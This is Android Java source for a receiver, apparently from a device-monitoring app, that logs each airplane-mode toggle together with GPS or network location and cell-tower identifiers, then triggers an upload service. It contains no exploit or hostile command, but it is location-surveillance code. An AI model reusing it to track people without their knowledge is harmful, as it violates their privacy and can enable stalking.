package com.mobiocean.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;

import com.mobiocean.database.DatabaseHabdler_SMSSent;
import com.mobiocean.service.UploadService;
import com.mobiocean.util.CallHelper;
import com.mobiocean.util.Struct_Send_SMSInfo;

import org.sn.location.LocationBean;
import org.sn.location.LocationDetails;

public class AirplaneModeReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        boolean isEnabled = Settings.System.getInt(
                context.getContentResolver(),
                Settings.System.AIRPLANE_MODE_ON, 0) == 1;
        String TimeStamp = CallHelper.GetTimeWithDate();
        DatabaseHabdler_SMSSent SMS_db = DatabaseHabdler_SMSSent.getInstance(context);
        LocationBean locationBean;
        {
            LocationDetails locationDetails = new LocationDetails(context);
            locationBean = locationDetails.getLocation();
        }
        String locSrc = "Google";
        if (locationBean.IsGPS)
            locSrc = "GPS";
        double lat = 0.0;
        double lon = 0.0;
        if (locationBean.IsGPS) {
            try {
                lat = Double.parseDouble(locationBean.Lat);
                lon = Double.parseDouble(locationBean.Longt);
            } catch (Exception ignore) {
            }
        }
        if (isEnabled) {
            SMS_db.addSMS(new Struct_Send_SMSInfo(601, TimeStamp, "ON", "" + locSrc, lat, lon, 17, System.currentTimeMillis(), locationBean.CellId, locationBean.LAC, locationBean.MCC, locationBean.MNC));
        } else {
            SMS_db.addSMS(new Struct_Send_SMSInfo(601, TimeStamp, "OFF", "" + locSrc, lat, lon, 17, System.currentTimeMillis(), locationBean.CellId, locationBean.LAC, locationBean.MCC, locationBean.MNC));
        }
        Intent msgIntent = new Intent(context, UploadService.class);
        Bundle b = new Bundle();
        msgIntent.putExtra("UploadStatus", 0);
        msgIntent.putExtras(b);
        context.startService(msgIntent);
    }

}
